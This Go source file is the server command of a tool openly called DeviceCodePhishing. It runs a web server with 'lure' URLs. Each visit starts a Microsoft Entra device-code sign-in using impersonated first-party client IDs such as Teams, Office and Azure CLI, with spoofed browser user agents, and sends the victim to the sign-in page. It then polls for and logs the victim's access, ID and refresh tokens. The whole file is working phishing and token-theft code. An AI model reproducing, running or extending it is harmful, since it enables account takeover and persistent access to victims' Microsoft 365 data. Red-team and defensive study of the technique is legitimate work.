package cmd

import (
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const DefaultTenant string = "common"

// Predefined user agents (updated to current versions)
var predefinedUserAgents = map[string]string{
	"firefox-android": "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
	"chrome-android":  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
	"edge-android":    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
	"android-browser": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
	"firefox-macos":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
	"chrome-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"edge-macos":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"safari-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"chrome-desktop":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"ie11":            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"firefox-windows": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
	"edge-legacy":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 Edg/100.0.1185.50",
	"edge-ios":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/131.0.0.0 Mobile/15E148 Safari/605.1.15",
	"chrome-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.0.0 Mobile/15E148 Safari/604.1",
	"safari-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	"firefox-ios":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/132.0 Mobile/15E148 Safari/605.1.15",
}

// Predefined ClientIds
var predefinedClientIds = map[string]string{
	"office365":       "00b41c95-dab0-4487-9791-b9d2c32c80f2", // Office 365 Management
	"azurecli":        "04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Microsoft Azure CLI
	"azurepowershell": "1950a258-227b-4e31-a9cf-717495945fc2", // Microsoft Azure PowerShell
	"msteams":         "1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
	"winsearch":       "26a7ee05-5602-4d76-a7ba-eae8b7b67941", // Windows Search
	"outlook":         "27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
	"authenticator":   "4813382a-8fa7-425e-ab75-3b753aab3abb", // Microsoft Authenticator App
	"onedrive":        "ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive SyncEngine
	"office":          "d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
	"visualstudio":    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", // Visual Studio
	"onedriveios":     "af124e86-4e96-495a-b70a-90f90ab96707", // OneDrive iOS App
	"bingsearch":      "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", // Microsoft Bing Search for Microsoft Edge
	"stream":          "844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft Stream Mobile Native
	"teamsadmin":      "87749df4-7ccf-48f8-aa87-704bad0e0e16", // Microsoft Teams - Device Admin Agent
	"bing":            "cf36b471-5b44-428c-9ce7-313bf84528de", // Microsoft Bing Search
	"msauthbroker":    "29d9ed98-a469-4536-ade2-f981bc1d605e", // Microsoft Authentication Broker
}

var (
	address         string
	customUserAgent string
	userAgent       string
	clientId        string
	clientIds       []string
	customClientIds []string
	tenant          string
	pathPrefix      string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Choose predefined User-Agent (see options below)")
	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token (legacy support)")
	runCmd.Flags().StringSliceVar(&clientIds, "client-ids", []string{}, "List of predefined ClientIds to use (see options below, comma-separated)")
	runCmd.Flags().StringSliceVar(&customClientIds, "custom-client-ids", []string{}, "List of custom ClientIds (comma-separated)")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path prefix for the lure URL (e.g., /custom)")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure

Predefined User-Agent options:
  firefox-android        - Firefox on Android
  chrome-android         - Chrome on Android
  edge-android          - Edge on Android
  android-browser       - Default Android browser
  firefox-macos         - Firefox on macOS
  chrome-macos          - Chrome on macOS
  edge-macos            - Edge on macOS
  safari-macos          - Safari on macOS
  chrome-desktop        - Chrome on Windows
  ie11                  - Internet Explorer 11
  firefox-windows       - Firefox on Windows
  edge-legacy           - Legacy Edge on Windows
  edge-ios              - Edge on iOS
  chrome-ios            - Chrome on iOS
  safari-ios            - Safari on iOS
  firefox-ios           - Firefox on iOS

Predefined ClientId options:
  office365             - Office 365 Management
  azurecli              - Microsoft Azure CLI
  azurepowershell       - Microsoft Azure PowerShell
  msteams               - Microsoft Teams
  winsearch             - Windows Search
  outlook               - Outlook Mobile
  authenticator         - Microsoft Authenticator App
  onedrive              - OneDrive SyncEngine
  office                - Microsoft Office
  visualstudio          - Visual Studio
  onedriveios           - OneDrive iOS App
  bingsearch            - Microsoft Bing Search for Microsoft Edge
  stream                - Microsoft Stream Mobile Native
  teamsadmin            - Microsoft Teams - Device Admin Agent
  bing                  - Microsoft Bing Search
  msauthbroker          - Microsoft Authentication Broker

Examples: 
  DeviceCodePhishing server --user-agent firefox-android --client-ids msteams,office
  DeviceCodePhishing server --custom-client-ids "your-custom-id"`,
	Run: func(cmd *cobra.Command, args []string) {
		// Determine which user agent to use
		finalUserAgent := customUserAgent
		if userAgent != "" {
			if ua, ok := predefinedUserAgents[userAgent]; ok {
				finalUserAgent = ua
			} else {
				slog.Error("Invalid user-agent choice", "available", strings.Join(getAvailableUserAgents(), ", "))
				os.Exit(1)
			}
		}

		// Determine which ClientIds to use
		finalClientIds := []string{}

		// Add predefined ClientIds
		if len(clientIds) > 0 {
			for _, predefined := range clientIds {
				if cid, ok := predefinedClientIds[predefined]; ok {
					finalClientIds = append(finalClientIds, cid)
				} else {
					slog.Error("Invalid client-id choice", "available", strings.Join(getAvailableClientIds(), ", "))
					os.Exit(1)
				}
			}
		}

		// Add custom ClientIds
		if len(customClientIds) > 0 {
			finalClientIds = append(finalClientIds, customClientIds...)
		}

		// Handle backward compatibility with single client-id flag
		if clientId != MsAuthenticationBroker && len(finalClientIds) == 0 {
			finalClientIds = []string{clientId}
		}

		// If no ClientIds specified, use default
		if len(finalClientIds) == 0 {
			finalClientIds = []string{MsAuthenticationBroker}
		}

		// Sanitize path prefix
		if pathPrefix != "" {
			if !strings.HasPrefix(pathPrefix, "/") {
				pathPrefix = "/" + pathPrefix
			}
			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
		}

		// Set up resource handlers for each client ID
		for i, cid := range finalClientIds {
			lurePath := pathPrefix + "/lure"
			if len(finalClientIds) > 1 {
				lurePath = lurePath + "/" + cid
			}
			http.HandleFunc(lurePath, getLureHandler(cid, finalUserAgent))

			if i == 0 {
				// Also register the base path for the first clientId (backward compatibility)
				http.HandleFunc(pathPrefix+"/lure", getLureHandler(cid, finalUserAgent))
			}
		}

		host, port, err := net.SplitHostPort(address)
		if err != nil || port == "" {
			slog.Error("Invalid address format", "address", address, "error", err)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server", "tenant", tenant)
		slog.Info("Using User-Agent", "userAgent", finalUserAgent)
		for _, cid := range finalClientIds {
			slog.Info("ClientId", "id", cid)
		}

		if host == "" {
			host = "localhost"
		}

		if len(finalClientIds) == 1 {
			slog.Info("Lure address", "url", host+":"+port+pathPrefix+"/lure")
		} else {
			slog.Info("Base lure address", "url", host+":"+port+pathPrefix+"/lure")
			for _, cid := range finalClientIds {
				slog.Info("Client-specific lure", "url", host+":"+port+pathPrefix+"/lure/"+cid)
			}
		}

		// Listen to HTTP connections and wait
		log.Fatal(server.ListenAndServe())
	},
}

func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		slog.Info("Lure opened", "clientId", clientId)

		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

		scopes := []string{"openid", "profile", "offline_access"}
		deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
		if err != nil {
			slog.Error("Error during starting device code flow", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
		if err != nil {
			slog.Error("Error during headless browser automation", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		go startPollForToken(tenant, clientId, deviceAuth)
		http.Redirect(w, r, redirectUri, http.StatusFound)
	}
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Check for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error("Error requesting token", "error", err)
			return
		}

		if result != nil {
			slog.Info("AccessToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "accessToken", result.AccessToken)
			slog.Info("IdToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "idToken", result.IdToken)
			slog.Info("RefreshToken received", "userCode", deviceAuth.UserCode, "clientId", clientId, "refreshToken", result.RefreshToken)
			return
		}
	}
}

func getAvailableUserAgents() []string {
	agents := make([]string, 0, len(predefinedUserAgents))
	for key := range predefinedUserAgents {
		agents = append(agents, key)
	}
	return agents
}

func getAvailableClientIds() []string {
	clients := make([]string, 0, len(predefinedClientIds))
	for key := range predefinedClientIds {
		clients = append(clients, key)
	}
	return clients
}
